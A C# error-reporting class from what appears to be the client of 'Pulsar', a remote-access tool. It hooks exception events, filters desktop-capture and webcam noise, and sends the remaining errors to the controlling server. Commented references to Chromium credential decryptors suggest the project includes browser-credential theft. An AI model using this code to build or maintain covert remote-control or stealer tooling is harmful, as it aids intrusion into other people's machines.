using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.ExceptionServices;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.User
{
    internal class DebugLog : IDisposable
    {
        private readonly PulsarClient _client;
        private readonly HashSet<Type> _ignoredExceptionTypes;
        private readonly HashSet<Type> _ignoredClasses;

        public DebugLog(PulsarClient client)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
            _ignoredExceptionTypes = new HashSet<Type>
                {
                    typeof(CryptographicException),
                    typeof(IOException),
                    typeof(UnauthorizedAccessException),
                    //typeof(FormatException)
                };

            _ignoredClasses = new HashSet<Type>
                {
                    //typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumDecryptor),
                    //typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumV127Decryptor)
                };

            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            Application.ThreadException += Application_ThreadException;
            TaskScheduler.UnobservedTaskException += TaskScheduler_UnobservedTaskException;
            AppDomain.CurrentDomain.FirstChanceException += FirstChanceExcpetion_Handler;
        }

        private void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.ExceptionObject is Exception ex)
            {
                if (ShouldIgnoreException(ex))
                {
                    return;
                }
                
                LogException(ex);
                _client.Send(new GetDebugLog { Log = ex.ToString() });
            }
        }

        private void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
        {
            if (ShouldIgnoreException(e.Exception))
            {
                return;
            }
            
            LogException(e.Exception);
            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
        }

        private void TaskScheduler_UnobservedTaskException(object sender, UnobservedTaskExceptionEventArgs e)
        {
            if (ShouldIgnoreException(e.Exception))
            {
                return;
            }
            
            LogException(e.Exception);
            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
        }

        private void FirstChanceExcpetion_Handler(object sender, FirstChanceExceptionEventArgs e)
        {
            if (_ignoredExceptionTypes.Contains(e.Exception.GetType()))
            {
                return;
            }

            // see if its class is ignored
            if (ShouldIgnoreException(e.Exception))
            {
                return;
            }

            LogException(e.Exception);
            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
        }

        private bool ShouldIgnoreException(Exception ex)
        {
            // check against ignored classes
            var declaringType = ex.TargetSite?.DeclaringType;
            if (declaringType != null && _ignoredClasses.Contains(declaringType))
            {
                return true;
            }

            if (ex is ApplicationException && 
                ex.Message.Contains("No devices of the category") &&
                ex.StackTrace?.Contains("AForge.Video.DirectShow.FilterInfoCollection.CollectFilters") == true)
            {
                return true;
            }

            if (IsBlacklistedMessage(ex.Message) || IsBlacklistedMessage(ex.ToString()))
            {
                return true;
            }

            return false;
        }

        private bool IsBlacklistedMessage(string message)
        {
            if (string.IsNullOrEmpty(message))
                return false;

            var blacklistedPatterns = new[]
            {
                "HRESULT: [0x887A0027]",
                "DXGI_ERROR_WAIT_TIMEOUT",
                "WaitTimeout",
                "The timeout value has elapsed and the resource is not yet available",
                "SharpDX.SharpDXException",
                "SharpDX.DXGI",
                "SharpDX.Result.CheckError()",
                "Waiting for frame requests. Buffer size:",
                "Received packet: GetDesktop",
                "Capture FPS:",
                "Buffer size:",
                "Pending requests:"
            };

            foreach (var pattern in blacklistedPatterns)
            {
                if (message.Contains(pattern))
                {
                    return true;
                }
            }

            return false;
        }

        private void LogException(Exception ex)
        {
            Debug.WriteLine($"Exception: {ex.Message}\nStack Trace: {ex.StackTrace}");
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Dispose managed resources here
            }
        }
    }
}